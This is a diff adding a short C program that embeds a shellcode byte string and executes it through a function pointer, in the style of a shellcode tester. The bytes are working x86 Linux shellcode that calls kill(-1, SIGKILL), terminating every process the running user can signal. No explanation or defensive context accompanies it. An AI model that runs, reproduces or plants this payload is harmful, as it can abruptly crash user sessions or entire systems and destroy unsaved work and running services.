@@ -1,0 +1,14 @@
+#include<stdio.h>
+#include<string.h>
+
+unsigned char shellcode[] = \
+"\x31\xc0\xb0\x25\x6a\xff\x5b\xb1\x09\xcd\x80";
+
+main()
+{
+printf("Shellcode Length: %d\n", strlen(shellcode));
+
+int (*ret)() = (int(*)())shellcode;
+
+ret();
+}
